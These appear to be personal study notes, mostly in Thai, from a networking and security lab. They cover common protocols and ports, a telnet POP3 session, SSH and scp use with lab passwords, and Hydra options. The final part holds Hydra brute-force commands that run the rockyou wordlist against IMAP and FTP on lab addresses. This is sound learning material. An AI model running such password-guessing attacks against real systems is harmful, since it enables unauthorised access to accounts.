โปรโตคอล  |	ใช้ทำอะไร |	พอร์ตหลัก |	ลักษณะการเชื่อมต่อ
Telnet | ควบคุมเครื่องระยะไกล |	23 | เชื่อมต่อแล้วพิมพ์คำสั่งบนเครื่องปลายทาง
HTTP |	เปิดเว็บ / API | 80 | Request → Response
FTP	| โอนย้ายไฟล์ |	21 | Login → list → upload/download
SMTP |	ส่งอีเมล |	25 / 587 |	ส่งอีเมลด้วยคำสั่ง MAIL, RCPT
POP3 |	ดาวน์โหลดอีเมล |	110 |	ดึงอีเมลลงเครื่อง (ลบที่ server)
IMAP |	ซิงค์อีเมล | 143 |	อ่านอีเมลบนเซิร์ฟเวอร์ (ไม่ลบ)

secure protocal
HTTP	80	HTTPS	443
FTP	21	FTPS	990
SMTP	25	SMTPS	465
POP3	110	POP3S	995
IMAP	143	IMAPS	993


เชื่อมต่อ ex.pop3
telnet xx.xx.xx.xx 110
USER sear
PASS sadfas
STAT
LIST (How many email messages are available to download via POP3 )

CIA (ฝ่ายป้องกัน)	↔	DAD (ฝ่ายโจมตี)
Confidentiality	←→	Disclosure (เปิดเผยข้อมูล)
Integrity	←→	Alteration (แก้ไขข้อมูล)
Availability	←→	Destruction (ทำลาย/ทำให้ล่ม)

SSH
ssh mark@xx.xx.xx.xx
p@ssword123
uname -r ( find the Kernel release)

scp mark@10.201.103.166:/home/mark/book.txt ~
p@ssword123

HYDRA
-s PORT to specify a non-default port for the service in question.
-V or -vV, for verbose, makes Hydra show the username and password combinations that are being tried. This verbosity is very convenient to see the progress, especially if you are still not confident of your command-line syntax.
-t n where n is the number of parallel connections to the target. -t 16 will create 16 threads used to connect to the target.
-d, for debugging, to get more detailed information about what’s going on. The debugging output can save you much frustration; for instance, if Hydra tries to connect to a closed port and timing out, -d will reveal this right away.

hydra -l username -P wordlist.txt server service
hydra -l lazie -P /usr/share/wordlists/rockyou.txt 10.201.103.166 imap
hydra -l quinn -P /usr/share/wordlists/rockyou.txt ftp://10.201.103.156:10021
ftp 10.201.103.156 10021
ls
get filename.txt